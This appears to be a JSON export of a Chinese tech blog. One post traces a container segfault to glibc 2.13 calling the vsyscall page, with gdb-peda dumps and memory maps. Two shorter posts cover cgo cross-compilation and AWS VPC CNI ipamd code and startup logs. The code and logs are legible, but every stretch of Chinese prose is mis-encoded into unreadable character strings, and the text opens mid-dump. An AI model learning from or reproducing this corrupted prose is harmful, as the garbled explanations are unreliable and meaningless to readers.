0x7ffd0d88baf8 --&gt; 0x7f6be2ca160d --&gt; 0x909090c308c48348RIP: 0xffffffffff600400R8 : 0x7ffd0d88cf60 (&quot;/bin/bash&quot;)R9 : 0x1R10: 0x0R11: 0x7f6be2ca1600 --&gt; 0xc0c74808ec8348R12: 0x42164c (&lt;_start&gt;:\txor ebp,ebp)R13: 0x7ffd0d88bd40 --&gt; 0x2R14: 0x0R15: 0x0EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]Invalid $PC address: 0xffffffffff600400[------------------------------------stack-------------------------------------]0000| 0x7ffd0d88baf8 --&gt; 0x7f6be2ca160d --&gt; 0x909090c308c483480008| 0x7ffd0d88bb00 --&gt; 0x6d (&#x27;m&#x27;)0016| 0x7ffd0d88bb08 --&gt; 0x420324 (&lt;main+1028&gt;:\tmov edx,DWORD PTR [rsp+0x28])0024| 0x7ffd0d88bb10 --&gt; 0x7ffd0d88bc80 --&gt; 0x2000000000032| 0x7ffd0d88bb18 --&gt; 0x7ffd0d88bd48 --&gt; 0x7ffd0d88cf60 (&quot;/bin/bash&quot;)0040| 0x7ffd0d88bb20 --&gt; 0x7ffd0d88bd60 --&gt; 0x7ffd0d88cf77 (&quot;HOSTNAME=899eea8d3958&quot;)0048| 0x7ffd0d88bb28 --&gt; 0x7f6b000000020056| 0x7ffd0d88bb30 --&gt; 0xf63d4e2e[------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGSEGV0xffffffffff600400 in ?? () å‘ç° RIP å¯„å­˜å™¨è®¿é—®äº†å†…æ ¸çš„åœ°å€ç©ºé—´äº†ï¼Œå†…æ ¸æ‰€åœ¨é«˜åœ°å€ã€‚ä»»ä½•ç³»ç»Ÿå°±ç»™å‘äº†ä¸€ä¸ª SIGSEGV ä¿¡å·ï¼Œé»˜è®¤è¡Œä¸ºå°±æ˜¯ç»ˆæ­¢è¿›ç¨‹ã€‚ 123456gdb-peda$ bt#0 0xffffffffff600400 in ?? ()#1 0x00007f828873f60d in time () from target:/lib/x86_64-linux-gnu/libc.so.6#2 0x0000000000420324 in main ()#3 0x00007f82886c0ead in __libc_start_main () from target:/lib/x86_64-linux-gnu/libc.so.6#4 0x0000000000421675 in _start () å¯ä»¥çœ‹åˆ°å…¶å®è¿›ç¨‹æ­»çš„æ—¶å€™è°ƒç”¨äº†æ ‡å‡†åº“é‡Œé¢çš„å‡½æ•° time() ï¼Œæ ‡å‡†åº“çš„é—®é¢˜åœ¨å®¹å™¨ä¸­ä½äº /lib/x86_64-linux-gnu/libc.so.6ã€‚ åæ±‡ç¼–çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„å®ç° 12345678gdb-peda$ disassemble 0x00007fa58acd060dDump of assembler code for function time: 0x00007fa58acd0600 &lt;+0&gt;:\tsub rsp,0x8 0x00007fa58acd0604 &lt;+4&gt;:\tmov rax,0xffffffffff600400 0x00007fa58acd060b &lt;+11&gt;:\tcall rax 0x00007fa58acd060d &lt;+13&gt;:\tadd rsp,0x8 0x00007fa58acd0611 &lt;+17&gt;:\tretEnd of assembler dump. å¯ä»¥çœ‹åˆ° rax å€¼å°±æ˜¯å¼‚å¸¸çš„åŸå› ï¼Œçœ‹ä¸€ä¸‹å½“å‰è¿›ç¨‹çš„ memory layoutã€‚å¯ä»¥çœ‹åˆ°è‡³å°‘æ²¡æœ‰å°† 0xffffffffff600400 è¿™ä¸ªåœ°å€æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚ 1234567891011121314151617181920212223242526272829gdb-peda$ vmmapStart End Perm\tName0x00400000 0x004e5000 r-xp\t/bin/bash0x006e4000 0x006e5000 r--p\t/bin/bash0x006e5000 0x006ee000 rw-p\t/bin/bash0x006ee000 0x006f4000 rw-p\tmapped0x0190e000 0x01910000 rw-p\t[heap]0x00007fa58ac33000 0x00007fa58adb5000 r-xp\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007fa58adb5000 0x00007fa58afb5000 ---p\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007fa58afb5000 0x00007fa58afb9000 r--p\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007fa58afb9000 0x00007fa58afba000 rw-p\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007fa58afba000 0x00007fa58afbf000 rw-p\tmapped0x00007fa58afbf000 0x00007fa58afc1000 r-xp\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007fa58afc1000 0x00007fa58b1c1000 ---p\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007fa58b1c1000 0x00007fa58b1c2000 r--p\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007fa58b1c2000 0x00007fa58b1c3000 rw-p\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007fa58b1c3000 0x00007fa58b1e8000 r-xp\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007fa58b1e8000 0x00007fa58b3e7000 ---p\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007fa58b3e7000 0x00007fa58b3eb000 r--p\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007fa58b3eb000 0x00007fa58b3ec000 rw-p\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007fa58b3ec000 0x00007fa58b40c000 r-xp\t/lib/x86_64-linux-gnu/ld-2.13.so0x00007fa58b604000 0x00007fa58b607000 rw-p\tmapped0x00007fa58b609000 0x00007fa58b60b000 rw-p\tmapped0x00007fa58b60b000 0x00007fa58b60c000 r--p\t/lib/x86_64-linux-gnu/ld-2.13.so0x00007fa58b60c000 0x00007fa58b60d000 rw-p\t/lib/x86_64-linux-gnu/ld-2.13.so0x00007fa58b60d000 0x00007fa58b60e000 rw-p\tmapped0x00007ffca937e000 0x00007ffca939f000 rw-p\t[stack]0x00007ffca93ca000 0x00007ffca93cd000 r--p\t[vvar]0x00007ffca93cd000 0x00007ffca93cf000 r-xp\t[vdso] ç¡®è®¤ä¸€ä¸‹ glibcçš„ç‰ˆæœ¬å¹¶å°†è¿™ä¸ªåŠ¨æ€è¿æ¥åº“å¤åˆ¶åˆ°å®¿ä¸»ä¸Šï¼Œåæ±‡ç¼–åˆ†æã€‚ 123456# ls /lib/x86_64-linux-gnu/libc.so.6/lib/x86_64-linux-gnu/libc.so.6# ls -al /lib/x86_64-linux-gnu/libc.so.6lrwxrwxrwx 1 root root 12 Oct 16 2014 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.13.so# ls /lib/x86_64-linux-gnu/libc-2.13.so/lib/x86_64-linux-gnu/libc-2.13.so åæ±‡ç¼–å¦‚ä¸‹å¯ä»¥çœ‹åˆ°å’Œè¿è¡Œæ—¶çš„ä»£ç æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç‰ˆæœ¬ glibc ä»£ç é‡Œé¢ç¡¬ç¼–ç äº† 0xffffffffff600400 è¿™ä¸ªåœ°å€ã€‚ 12345678910# gdb -q libc-2.13.soReading symbols from libc-2.13.so...(no debugging symbols found)...done.gdb-peda$ disassemble timeDump of assembler code for function time: 0x000000000009d600 &lt;+0&gt;:\tsub rsp,0x8 0x000000000009d604 &lt;+4&gt;:\tmov rax,0xffffffffff600400 0x000000000009d60b &lt;+11&gt;:\tcall rax 0x000000000009d60d &lt;+13&gt;:\tadd rsp,0x8 0x000000000009d611 &lt;+17&gt;:\tretEnd of assembler dump. è¿™ä¹Ÿå°±åˆæ­¥éªŒè¯äº†å°±æ˜¯åº”è¯¥æ˜¯ ABI å±‚é¢çš„å…¼å®¹é—®é¢˜ï¼ŒGoogle ä¸€ä¸‹è§£å†³æ–¹æ¡ˆä¹Ÿæ˜¯å¾ˆç®€å•çš„åœ¨ grub é‡Œé¢é…ç½®å¯åŠ¨å‚æ•° vsyscall=emulateï¼Œä¹‹æ‰€ä»¥è¿™æ ·é…ç½®çš„åŸå› æ˜¯ kernel Configã€‚ ä¿®æ”¹å‚æ•°ä¿®æ”¹ä¸€ä¸‹é‡æ–°å°è¯•ï¼Œå‘ç°å†…å­˜é‡Œé¢å¤šäº†ä¸€ä¸ª vsyscall çš„ 4k pageã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647gdb-peda$ vmmapStart End Perm\tName0x00400000 0x004e5000 r-xp\t/bin/bash0x006e4000 0x006e5000 r--p\t/bin/bash0x006e5000 0x006ee000 rw-p\t/bin/bash0x006ee000 0x006f4000 rw-p\tmapped0x0134e000 0x0138b000 rw-p\t[heap]0x00007f2d59391000 0x00007f2d5939c000 r-xp\t/lib/x86_64-linux-gnu/libnss_files-2.13.so0x00007f2d5939c000 0x00007f2d5959b000 ---p\t/lib/x86_64-linux-gnu/libnss_files-2.13.so0x00007f2d5959b000 0x00007f2d5959c000 r--p\t/lib/x86_64-linux-gnu/libnss_files-2.13.so0x00007f2d5959c000 0x00007f2d5959d000 rw-p\t/lib/x86_64-linux-gnu/libnss_files-2.13.so0x00007f2d5959d000 0x00007f2d595a7000 r-xp\t/lib/x86_64-linux-gnu/libnss_nis-2.13.so0x00007f2d595a7000 0x00007f2d597a6000 ---p\t/lib/x86_64-linux-gnu/libnss_nis-2.13.so0x00007f2d597a6000 0x00007f2d597a7000 r--p\t/lib/x86_64-linux-gnu/libnss_nis-2.13.so0x00007f2d597a7000 0x00007f2d597a8000 rw-p\t/lib/x86_64-linux-gnu/libnss_nis-2.13.so0x00007f2d597a8000 0x00007f2d597bd000 r-xp\t/lib/x86_64-linux-gnu/libnsl-2.13.so0x00007f2d597bd000 0x00007f2d599bc000 ---p\t/lib/x86_64-linux-gnu/libnsl-2.13.so0x00007f2d599bc000 0x00007f2d599bd000 r--p\t/lib/x86_64-linux-gnu/libnsl-2.13.so0x00007f2d599bd000 0x00007f2d599be000 rw-p\t/lib/x86_64-linux-gnu/libnsl-2.13.so0x00007f2d599be000 0x00007f2d599c0000 rw-p\tmapped0x00007f2d599c0000 0x00007f2d599c7000 r-xp\t/lib/x86_64-linux-gnu/libnss_compat-2.13.so0x00007f2d599c7000 0x00007f2d59bc6000 ---p\t/lib/x86_64-linux-gnu/libnss_compat-2.13.so0x00007f2d59bc6000 0x00007f2d59bc7000 r--p\t/lib/x86_64-linux-gnu/libnss_compat-2.13.so0x00007f2d59bc7000 0x00007f2d59bc8000 rw-p\t/lib/x86_64-linux-gnu/libnss_compat-2.13.so0x00007f2d59bc8000 0x00007f2d59d4a000 r-xp\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007f2d59d4a000 0x00007f2d59f4a000 ---p\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007f2d59f4a000 0x00007f2d59f4e000 r--p\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007f2d59f4e000 0x00007f2d59f4f000 rw-p\t/lib/x86_64-linux-gnu/libc-2.13.so0x00007f2d59f4f000 0x00007f2d59f54000 rw-p\tmapped0x00007f2d59f54000 0x00007f2d59f56000 r-xp\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007f2d59f56000 0x00007f2d5a156000 ---p\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007f2d5a156000 0x00007f2d5a157000 r--p\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007f2d5a157000 0x00007f2d5a158000 rw-p\t/lib/x86_64-linux-gnu/libdl-2.13.so0x00007f2d5a158000 0x00007f2d5a17d000 r-xp\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007f2d5a17d000 0x00007f2d5a37c000 ---p\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007f2d5a37c000 0x00007f2d5a380000 r--p\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007f2d5a380000 0x00007f2d5a381000 rw-p\t/lib/x86_64-linux-gnu/libtinfo.so.5.90x00007f2d5a381000 0x00007f2d5a3a1000 r-xp\t/lib/x86_64-linux-gnu/ld-2.13.so0x00007f2d5a599000 0x00007f2d5a59c000 rw-p\tmapped0x00007f2d5a59e000 0x00007f2d5a5a0000 rw-p\tmapped0x00007f2d5a5a0000 0x00007f2d5a5a1000 r--p\t/lib/x86_64-linux-gnu/ld-2.13.so0x00007f2d5a5a1000 0x00007f2d5a5a2000 rw-p\t/lib/x86_64-linux-gnu/ld-2.13.so0x00007f2d5a5a2000 0x00007f2d5a5a3000 rw-p\tmapped0x00007ffe04499000 0x00007ffe044ba000 rw-p\t[stack]0x00007ffe044d0000 0x00007ffe044d3000 r--p\t[vvar]0x00007ffe044d3000 0x00007ffe044d5000 r-xp\t[vdso]0xffffffffff600000 0xffffffffff601000 r-xp\t[vsyscall] ä¹Ÿå°±è¯´å¯ç”¨è¿™ä¸ªç‰¹æ€§æ“ä½œç³»ç»Ÿä¼šæœ‰æ›´å¥½çš„å‘ä¸‹å…¼å®¹çš„ç‰¹æ€§ï¼Œä½†æ˜¯è¿™ä¸ªæ“ä½œç³»ç»Ÿä¸Šçš„æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½ä¼šæ˜ å°„ä¸€å—å†…æ ¸çš„åœ°å€ç©ºé—´ã€‚","tags":["go"]},{"title":"cgo äº¤å‰ç¼–è¯‘","path":"/2020/03/11/cgo-cross-compiler/","content":"æ—¥å¸¸å·¥ä½œæ˜¯å†™ golangï¼Œåœ¨ mac ä¸Šå¼€å‘ä»£ç ï¼Œé€šè¿‡ GOOS æŒ‡å®šæ“ä½œç³»ç»Ÿè¿›è¡Œäº¤å‰ç¼–è¯‘å‘å¸ƒåˆ° Linux ç¯å¢ƒã€‚ ä½†æ˜¯åœ¨è¿™ä¸€æ¬¡çš„éœ€æ±‚ä¸­åœ¨ golang çš„é¡¹ç›®ä¸­å¼•ç”¨äº† C ä»£ç ï¼Œå¸¦æ¥çš„åæœå°±æ˜¯æŒ‡å®š GOOS è¿›è¡Œäº¤å‰ç¼–è¯‘å¤±è´¥ã€‚ C ä»£ç æ˜¯ inline çš„æ–¹å¼å¼•å…¥çš„ï¼Œå½¢å¼å¦‚ä¸‹ 1234567891011121314package testimport (\t&quot;fmt&quot;\t&quot;unsafe&quot;)//#include &lt;stdio.h&gt;//#include &lt;stdint.h&gt;//#include &lt;math.h&gt;//#include &lt;string.h&gt;//#include &lt;stdlib.h&gt;... some codeimport &quot;C&quot; æ­£ç¡®çš„è¿›è¡Œå« cgo ä»£ç çš„äº¤å‰ç¼–è¯‘éœ€è¦ 2 æ­¥ï¼Œé¦–å…ˆå®‰è£… mac ä¸‹ Linux å¹³å°äº¤å‰ç¼–è¯‘å·¥å…·é“¾ brew install FiloSottile/musl-cross/musl-crossï¼Œéœ€è¦ç›¸å½“ä¸€æ®µæ—¶é—´æ‰èƒ½å®‰è£…å¥½ã€‚ å…¶æ¬¡æŒ‡å®š makefile æˆ–è€… å…¶ä»–å½¢å¼çš„ç¼–è¯‘å‚æ•° CC=&quot;x86_64-linux-musl-gcc&quot;, ä¸ CGO_LDFLAGS=&quot;-static&quot;ã€‚ makefile æ˜¯æˆ‘å·¥ä½œçš„æ­£å¸¸ç¼–è¯‘ç®¡ç†å·¥å…·ï¼Œä¿®æ”¹å¦‚ä¸‹ã€‚ 12345678go-build:\tCGO_ENABLED=1 \\\tGO111MODULE=off \\\tGOOS=&quot;linux&quot; \\\tGOARCH=&quot;amd64&quot; \\\tCC=&quot;x86_64-linux-musl-gcc&quot; \\\tCGO_LDFLAGS=&quot;-static&quot; \\\tgo build -a -v -ldflags $(LDFLAGS) main.go","tags":["go"]},{"title":"amzon aws cni è¸©å‘ 2","path":"/2019/11/25/amazon-vpc-cni-delete-eni/","content":"ç›®å‰ä¸šåŠ¡ä¸Šå‡†å¤‡è¯•ç”¨ aws vpc cni æ–¹æ¡ˆï¼Œä¹‹å‰é‡åˆ°äº†ä¸€äº› cni çš„ä½¿ç”¨é—®é¢˜å‘ç°è¿˜æœ‰ä¸€äº›ç»†èŠ‚ä¸äº†è§£ã€‚ é‚å»å°è¯•ä½¿ç”¨å®ƒæä¾›çš„ä¸€äº›ç‰¹æ€§å¼€å…³ï¼Œåœ¨è¯•ç”¨ AWS_VPC_K8S_CNI_EXTERNALSNAT å¼€å…³ï¼Œé‡å»ºäº† aws node ds, å‘ç° ec2 èŠ‚ç‚¹çš„ ç½‘å¡è¢« deattach äº†ï¼Œç»§è€Œå¯¼è‡´äº†ä½¿ç”¨äº†ç»‘å®šåœ¨è¿™ä¸ªç½‘å¡ä¸Šçš„æµ®åŠ¨ ip çš„ pod å¤±è”äº†ã€‚ ç»“è®ºï¼šæ˜¯ ipamd deattach äº† eni, æ˜¯ ipamd delete äº† eni. ipamd è¿™ä¹Ÿçš„é€»è¾‘å¾ˆå¥‡æ€ªï¼Œçœ‹ä»£ç æ²¡æœ‰å‘ç°æ˜æ˜¾é€»è¾‘é—®é¢˜ã€‚ ä»£ç åˆ†æä¸‹é¢å°±æ˜¯ ipamd çš„èµ·æ‰‹ä»£ç ï¼Œæ— å…³é€»è¾‘ç›´æ¥åˆ é™¤äº†æ–¹ä¾¿æ¢³ç†æ ¸å¿ƒã€‚ 123456789101112131415func _main() int &#123;...\tdiscoverController := k8sapi.NewController(kubeClient)\tgo discoverController.DiscoverK8SPods()\teniConfigController := eniconfig.NewENIConfigController()...\tipamContext, err := ipamd.New(discoverController, eniConfigController)\tif err != nil &#123; log.Errorf(&quot;Initialization failure: %v&quot;, err) return 1\t&#125;\t...&#125; ä¸Šè¿°ä»£ç å’Œé‡é€»è¾‘ï¼Œæ ¸å¿ƒåœ¨ ipamd.New çš„å®ç°ä¸­ï¼Œä¸‹é¢å°±çœ‹ä¸€ä¸‹è¿™ä¸ª function çš„å®ç° 123456789// New retrieves IP address usage information from Instance MetaData service and Kubelet// then initializes IP address pool data storefunc New(k8sapiClient k8sapi.K8SAPIs, eniConfig *eniconfig.ENIConfigController) (*IPAMContext, error) &#123;...\tc.warmENITarget = getWarmENITarget()\tc.warmIPTarget = getWarmIPTarget()\terr = c.nodeInit()... ä¸Šè¿°ä»£ç å°±æ˜¯å‡½æ•°æ ¸å¿ƒï¼Œçœ‹ä¸€ä¸‹å®˜æ–¹çš„çš„è®¾è®¡æè®®é‡Œé¢L-IPAM can immediately take one available secondary IP address from its warm pool and assign it to Pod., é‚£ä¸¤è¡Œä»£ç å°±æ˜¯å‡†å¤‡å»æ»¡è¶³è¿™ä¸ªè®¾è®¡éœ€æ±‚çš„ã€‚ å…¶å®åé¢ nodeInit æ‰æ˜¯è¿™ä¸€ä¸²ä»£ç ä¸­çš„å…³é”®ç‚¹ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118//TODO need to break this function down(comments from CR)func (c *IPAMContext) nodeInit() error &#123;...\tc.maxENI, err = c.getMaxENI()\tif err != nil &#123; log.Error(&quot;Failed to get ENI limit&quot;) return err\t&#125;\tenisMax.Set(float64(c.maxENI))\tc.maxIPsPerENI, err = c.awsClient.GetENIipLimit()\tif err != nil &#123; log.Error(&quot;Failed to get IPs per ENI limit&quot;) return err\t&#125;\tipMax.Set(float64(c.maxIPsPerENI * c.maxENI)) // å› ä¸º ec2 ä¸åŒæœºå‹å¯ä»¥æ·»åŠ  eni ä»¥åŠæ¯ä¸ª eni ä¸Šé™„åŠ çš„ ip æ•°é‡ä¸ä¸€è‡´ã€‚\tc.useCustomNetworking = UseCustomNetworkCfg()\tc.primaryIP = make(map[string]string)\tc.reconcileCooldownCache.cache = make(map[string]time.Time)\tenis, err := c.awsClient.GetAttachedENIs()\tif err != nil &#123; log.Error(&quot;Failed to retrieve ENI info&quot;) return errors.New(&quot;ipamd init: failed to retrieve attached ENIs info&quot;)\t&#125;\t_, vpcCIDR, err := net.ParseCIDR(c.awsClient.GetVPCIPv4CIDR())\tif err != nil &#123; log.Error(&quot;Failed to parse VPC IPv4 CIDR&quot;, err.Error()) return errors.Wrap(err, &quot;ipamd init: failed to retrieve VPC CIDR&quot;)\t&#125;\tprimaryIP := net.ParseIP(c.awsClient.GetLocalIPv4())\terr = c.networkClient.SetupHostNetwork(vpcCIDR, c.awsClient.GetVPCIPv4CIDRs(), c.awsClient.GetPrimaryENImac(), &amp;primaryIP)\tif err != nil &#123; log.Error(&quot;Failed to set up host network&quot;, err) return errors.Wrap(err, &quot;ipamd init: failed to set up host network&quot;)\t&#125;\tc.dataStore = datastore.NewDataStore() // è¿™é‡Œå°±æ˜¯åˆ›å»ºé‚£ä¸ªæœ¬åœ° ip æ± çš„æ•°æ®ç»“æ„äº†\tfor _, eni := range enis &#123; log.Debugf(&quot;Discovered ENI %s, trying to set it up&quot;, eni.ENIID) // Retry ENI sync retry := 0 for &#123; retry++ err = c.setupENI(eni.ENIID, eni) // è¿™ä¸ªå‡½æ•°åªè¦å¹²ä¸‰ä»¶äº‹æƒ… // 1 æŠŠ eni æ·»åŠ åˆ° datastore ä¸­ã€‚ // 2 æŠŠ è®¾ç½® Linux eni ç›¸å…³ï¼Œ // 3 å°† eni çš„æµ®åŠ¨ ip æ”¾ç½®åˆ° datastore ä¸­ // è™½ç„¶éƒ½æ˜¯ä¸æœ¬æ¬¡é—®é¢˜æ²¡æœ‰å…³ç³»çš„ã€‚ if retry &gt; maxRetryCheckENI &#123; log.Errorf(&quot;Unable to discover attached IPs for ENI from metadata service&quot;) ipamdErrInc(&quot;waitENIAttachedMaxRetryExceeded&quot;) break &#125;... break &#125;\t&#125;\tusedIPs, err := c.getLocalPodsWithRetry()\tlog.Debugf(&quot;getLocalPodsWithRetry() found %d used IPs.&quot;, len(usedIPs))\t// ä¸Šé¢ function é‡å»ºæœ¬åœ° pod ä¿¡æ¯ï¼ŒåŒ…æ‹¬ name/namespace/ip/containerid if err != nil &#123; log.Warnf(&quot;During ipamd init, failed to get Pod information from kubelet %v&quot;, err) ipamdErrInc(&quot;nodeInitK8SGetLocalPodIPsFailed&quot;) // This can happens when L-IPAMD starts before kubelet. // TODO need to add node health stats here return errors.Wrap(err, &quot;failed to get running pods!&quot;)\t&#125;\trules, err := c.networkClient.GetRuleList()\tif err != nil &#123; log.Errorf(&quot;During ipamd init: failed to retrieve IP rule list %v&quot;, err) return nil\t&#125;\tfor _, ip := range usedIPs &#123; if ip.Container == &quot;&quot; &#123; log.Infof(&quot;Skipping Pod %s, Namespace %s, due to no matching container&quot;, ip.Name, ip.Namespace) continue &#125; if ip.IP == &quot;&quot; &#123; log.Infof(&quot;Skipping Pod %s, Namespace %s, due to no IP&quot;, ip.Name, ip.Namespace) continue &#125; log.Infof(&quot;Recovered AddNetwork for Pod %s, Namespace %s, Container %s&quot;, ip.Name, ip.Namespace, ip.Container) _, _, err = c.dataStore.AssignPodIPv4Address(ip) if err != nil &#123; ipamdErrInc(&quot;nodeInitAssignPodIPv4AddressFailed&quot;) log.Warnf(&quot;During ipamd init, failed to use pod IP %s returned from Kubelet %v&quot;, ip.IP, err) // TODO continue, but need to add node health stats here // TODO need to feed this to controller on the health of pod and node // This is a bug among kubelet/cni-plugin/l-ipamd/ec2-metadata that this particular pod is using an non existent ip address. // Here we choose to continue instead of returning error and EXIT out L-IPAMD(exit L-IPAMD will make whole node out) // The plan(TODO) is to feed this info back to controller and let controller cleanup this pod from this node. &#125; // Update ip rules in case there is a change in VPC CIDRs, AWS_VPC_K8S_CNI_EXTERNALSNAT setting srcIPNet := net.IPNet&#123;IP: net.ParseIP(ip.IP), Mask: net.IPv4Mask(255, 255, 255, 255)&#125; vpcCIDRs := c.awsClient.GetVPCIPv4CIDRs() var pbVPCcidrs []string for _, cidr := range vpcCIDRs &#123; pbVPCcidrs = append(pbVPCcidrs, *cidr) &#125; err = c.networkClient.UpdateRuleListBySrc(rules, srcIPNet, pbVPCcidrs, !c.networkClient.UseExternalSNAT()) if err != nil &#123; log.Errorf(&quot;UpdateRuleListBySrc in nodeInit() failed for IP %s: %v&quot;, ip.IP, err) &#125;\t&#125;\treturn nil&#125; ç¨å¾®å°ç»“ä¸€ä¸‹ï¼Œä¸Šé¢æ˜¯åˆå§‹åŒ–æµç¨‹ï¼Œæ¯ä¸€æ¬¡å¯åŠ¨çš„æ—¶å€™ ipamd ä¼šåœ¨æœ¬åœ°å»ºä¸€ä¸ªåœ°å€æ± ï¼Œå¹¶é€šè¿‡æœ¬åœ°ä¸€ä¸ª dataStoreæ¥æ ‡è®°åœ°å€æ± çš„åˆ†é…çŠ¶æ€ã€‚ å…·ä½“çš„ä¸‹æ–¹è§„åˆ™åœ¨æˆ‘ä»¬è¿™ä¸ªé—®é¢˜é‡Œé¢å¹¶ä¸å…³å¿ƒï¼Œæ˜¯å› ä¸ºæˆ‘é‡åˆ°çš„ä¸æ˜¯iptablesçš„è½¬å‘é—®é¢˜ã€‚ çœ‹ä¸€ä¸‹æ¯æ¬¡é‡å¯é‡æ–°æ ‡è®°åˆ†é…å‡ºå»çš„ ip çš„é€»è¾‘ï¼Œå…¶å®æ ¸å¿ƒé€»è¾‘å°±æ˜¯ assignPodIPv4AddressUnsafe ä¸­åœ¨å†…å­˜ä¸­é‡å»ºåˆ†é…æ•°æ®ã€‚ 12345678910111213141516171819202122232425262728// AssignPodIPv4Address assigns an IPv4 address to pod// It returns the assigned IPv4 address, device number, errorfunc (ds *DataStore) AssignPodIPv4Address(k8sPod *k8sapi.K8SPodInfo) (string, int, error) &#123;\tds.lock.Lock()\tdefer ds.lock.Unlock()\tlog.Debugf(&quot;AssignIPv4Address: IP address pool stats: total: %d, assigned %d&quot;, ds.total, ds.assigned)\tpodKey := PodKey&#123; name: k8sPod.Name, namespace: k8sPod.Namespace, container: k8sPod.Container,\t&#125;\tipAddr, ok := ds.podsIP[podKey]\tif ok &#123; if ipAddr.IP == k8sPod.IP &amp;&amp; k8sPod.IP != &quot;&quot; &#123; // The caller invoke multiple times to assign(PodName/NameSpace --&gt; same IPAddress). It is not a error, but not very efficient. log.Infof(&quot;AssignPodIPv4Address: duplicate pod assign for IP %s, name %s, namespace %s, container %s&quot;, k8sPod.IP, k8sPod.Name, k8sPod.Namespace, k8sPod.Container) return ipAddr.IP, ipAddr.DeviceNumber, nil &#125; // TODO Handle this bug assert? May need to add a counter here, if counter is too high, need to mark node as unhealthy... // This is a bug that the caller invokes multiple times to assign(PodName/NameSpace -&gt; a different IP address). log.Errorf(&quot;AssignPodIPv4Address: current IP %s is changed to IP %s for pod(name %s, namespace %s, container %s)&quot;, ipAddr, k8sPod.IP, k8sPod.Name, k8sPod.Namespace, k8sPod.Container) return &quot;&quot;, 0, errors.New(&quot;AssignPodIPv4Address: invalid pod with multiple IP addresses&quot;)\t&#125;\treturn ds.assignPodIPv4AddressUnsafe(k8sPod)&#125; æ—¥å¿—åˆ†æç¬¬ä¸€æ®µæ˜¯æ— å…³ä»£ç ï¼ŒåŸºæœ¬çš„ä¸€äº›ç‰ˆæœ¬ä¿¡æ¯ 12342019-11-26T02:28:11.342Z [INFO]\tStarting L-IPAMD v1.5.3 ...2019-11-26T02:28:11.380Z [INFO]\tTesting communication with server2019-11-26T02:28:11.380Z [INFO]\tRunning with Kubernetes cluster version: v1.12. git version: v1.12.4+0422-clusterip-bugfix. git tree state: archive. commit: f49fa022dbe63faafd0da106ef7e05a29721d3f1. platform: linux/amd642019-11-26T02:28:11.380Z [INFO]\tCommunication with server successful main å‡½æ•°å¼€å§‹äº†ï¼Œé€šè¿‡ ec2 çš„ metadata æ¥å£é€šè¿‡ discover å‡½æ•°çš„å®ç°æ¥æ”¶é›† ipamd å¯åŠ¨éœ€è¦çš„ä¿¡æ¯ã€‚ 1234567891011121314151617182019-11-26T02:28:11.380Z [INFO]\tStarting Pod controller2019-11-26T02:28:11.380Z [INFO]\tWaiting for controller cache sync2019-11-26T02:28:11.382Z [DEBUG]\tDiscovered region: us-east-12019-11-26T02:28:11.382Z [DEBUG]\tFound availability zone: us-east-1a2019-11-26T02:28:11.383Z [DEBUG]\tDiscovered the instance primary ip address: 10.0.10.662019-11-26T02:28:11.383Z [DEBUG]\tFound instance-id: i-0ba03a7c305eb480c2019-11-26T02:28:11.384Z [DEBUG]\tFound instance-type: c5.xlarge2019-11-26T02:28:11.384Z [DEBUG]\tFound primary interface&#x27;s MAC address: 02:43:a8:0e:05:2f2019-11-26T02:28:11.384Z [DEBUG]\tDiscovered 2 interfaces.2019-11-26T02:28:11.385Z [DEBUG]\tFound device-number: 02019-11-26T02:28:11.385Z [DEBUG]\tFound account ID: 1795166460502019-11-26T02:28:11.386Z [DEBUG]\tFound eni: eni-0debffa6dcf067b1b2019-11-26T02:28:11.386Z [DEBUG]\tFound ENI eni-0debffa6dcf067b1b is a primary ENI2019-11-26T02:28:11.392Z [DEBUG]\tFound security-group id: sg-0ade1b7b97edfbc0b2019-11-26T02:28:11.392Z [DEBUG]\tFound security-group id: sg-05c56cb6937b7cd9e2019-11-26T02:28:11.393Z [DEBUG]\tFound subnet-id: subnet-048c7f0d1e821113d2019-11-26T02:28:11.393Z [DEBUG]\tFound vpc-ipv4-cidr-block: 10.0.0.0/162019-11-26T02:28:11.394Z [DEBUG]\tFound VPC CIDR: 10.0.0.0/16 ä¸‹é¢å°±æ˜¯å‡†å¤‡ node init äº†ï¼Œå‡†å¤‡æœ¬åœ°è·¯ç”±è¡¨ï¼Œè½¬å‘è§„åˆ™ï¼Œå»ºç«‹æœ¬åœ°å€æ± ã€‚ å…¶ä¸­å»ºç«‹åœ°å€æ± çš„è¿‡ç¨‹æ¦‚è¿°å°±æ˜¯è·å–å¼¹æ€§ç½‘å¡ï¼Œä»å¼¹æ€§ç½‘å¡ä¸Šè·å–æµ®åŠ¨ ipï¼Œå°†æµ®åŠ¨ ip 